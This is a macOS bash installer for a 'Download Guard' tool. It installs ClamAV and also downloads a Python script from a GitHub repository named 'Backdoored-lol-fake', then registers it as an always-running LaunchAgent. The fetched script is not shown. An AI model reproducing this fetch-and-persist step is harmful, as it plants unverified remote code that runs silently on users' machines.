#!/bin/bash
set -euo pipefail

APP_DIR="$HOME/Library/Application Support/DownloadGuard"
AGENT_DIR="$HOME/Library/LaunchAgents"
PLIST="$AGENT_DIR/com.c0oled.downloadguard.plist"
BASE="https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main"

if [[ "$(uname -s)" != "Darwin" ]]; then
  echo "Download Guard currently supports macOS only."
  exit 1
fi
if ! command -v brew >/dev/null 2>&1; then
  echo "Homebrew is required. Install it from https://brew.sh, then rerun this command."
  exit 1
fi

echo "[1/4] Installing ClamAV..."
brew list clamav >/dev/null 2>&1 || brew install clamav

mkdir -p "$APP_DIR" "$APP_DIR/Quarantine" "$APP_DIR/Logs" "$AGENT_DIR"
curl -fsSL "$BASE/scanner.py" -o "$APP_DIR/scanner.py"
chmod 700 "$APP_DIR/scanner.py"

FRESHCONF="$APP_DIR/freshclam.conf"
cat > "$FRESHCONF" <<EOF
DatabaseDirectory $APP_DIR/db
UpdateLogFile $APP_DIR/Logs/freshclam.log
DatabaseOwner $(id -un)
EOF
mkdir -p "$APP_DIR/db"
chmod 700 "$APP_DIR/db"

FRESHCLAM="$(command -v freshclam || true)"
CLAMSCAN="$(command -v clamscan || true)"
if [[ -z "$FRESHCLAM" || -z "$CLAMSCAN" ]]; then
  echo "ClamAV commands were not found after installation."
  exit 1
fi

echo "[2/4] Downloading malware signatures..."
"$FRESHCLAM" --config-file="$FRESHCONF" || {
  echo "Signature update failed. The monitor will not start until signatures are available."
  exit 1
}

cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.c0oled.downloadguard</string>
  <key>ProgramArguments</key>
  <array><string>/usr/bin/python3</string><string>$APP_DIR/scanner.py</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>$APP_DIR/Logs/monitor.out.log</string>
  <key>StandardErrorPath</key><string>$APP_DIR/Logs/monitor.err.log</string>
</dict>
</plist>
EOF

echo "[3/4] Registering background monitor..."
launchctl bootout "gui/$(id -u)/com.c0oled.downloadguard" >/dev/null 2>&1 || true
launchctl bootstrap "gui/$(id -u)" "$PLIST"
launchctl enable "gui/$(id -u)/com.c0oled.downloadguard"

echo "[4/4] Done."
echo "Download Guard is watching: $HOME/Downloads"
echo "Quarantine: $APP_DIR/Quarantine"
echo "Logs: $APP_DIR/Logs"
